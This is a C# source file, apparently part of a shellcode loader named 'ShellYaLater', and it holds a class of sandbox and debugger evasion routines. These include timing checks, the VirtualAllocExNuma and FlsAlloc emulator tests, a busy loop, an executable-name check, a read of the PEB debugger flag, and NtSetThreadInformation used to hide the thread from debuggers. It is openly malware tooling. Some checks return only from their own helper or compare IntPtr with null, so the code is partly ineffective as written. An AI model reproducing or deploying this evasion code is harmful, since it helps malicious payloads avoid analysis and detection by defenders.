using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;


namespace ShellYaLater.Evasion_Class
{
    internal class SherryChristmas
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        private delegate IntPtr TRY1();
        private static TRY1 OOPS;
        public static void SleepTimer()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
        }

        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        private delegate IntPtr VAT(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        private static VAT VIT;
        public static void VAE()
        {
            VIT = VirtualAllocExNuma;
            OOPS = GetCurrentProcess;
            IntPtr mem = VIT(OOPS(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
        }


        
        [DllImport("kernel32.dll")]
        static extern IntPtr FlsAlloc(IntPtr lpCallback);
        private delegate IntPtr FIZZ(IntPtr lpCallback);
        private static FIZZ FUZZ;
        public static void FA()
        {
            FUZZ = FlsAlloc;
            IntPtr result = FUZZ(IntPtr.Zero);
            if (result == null)
            {
                return;
            }
        }
        
        public static void ManyIterations()
        {
            int count = 0;
            int max = 900000000;
            for (int i = 0; i < max; i++)
            {
                count++;
            }
            if (count == max)
            {
                return;
            }
        }
        
        public static void FilenameCheck()
        {
            string exename = "ShellYaLater";
            if (Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]) != exename)
            {
                return;
            }
        }

        
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        public static void ProcessChecker()
        {
            const int ProcessBasicInformation = 0;

            
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;

            
            PROCESS_BASIC_INFORMATION procInfo = new PROCESS_BASIC_INFORMATION();
            uint retLength = 0;

            
            int status = ZwQueryInformationProcess(
                currentProcess,
                ProcessBasicInformation,
                ref procInfo,
                (uint)Marshal.SizeOf(procInfo),
                ref retLength
            );

            if (status != 0) 
            {
                
                return;            
            }
            if (Marshal.ReadByte(procInfo.PebAddress, 2) != 0)
            {
                return;
            }

            
            
        }
        

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThreadId();

        private delegate IntPtr GCI();
        private static GCI IGC;

        [DllImport("kernel32.dll")]
        private static extern void ExitProcess(uint uExitCode);

        private delegate void PE(uint uExitCode);
        private static PE TREE;

        [DllImport("ntdll.dll")]
        private static extern int NtSetThreadInformation(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadPriority, long ThreadLength);

        private delegate int NSTI(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadPriority, long ThreadLength);
        private static NSTI TRUST;
        public static void NSTT()
        {
            IGC = GetCurrentThreadId;
            TREE = ExitProcess;
            TRUST = NtSetThreadInformation;
            IntPtr ThreadHandle = IGC();
            int status = TRUST(ThreadHandle, 0x11, IntPtr.Zero, 0);
            
            if (status != 0)
            {
                TREE((uint)status);
            }
        }

    }
}
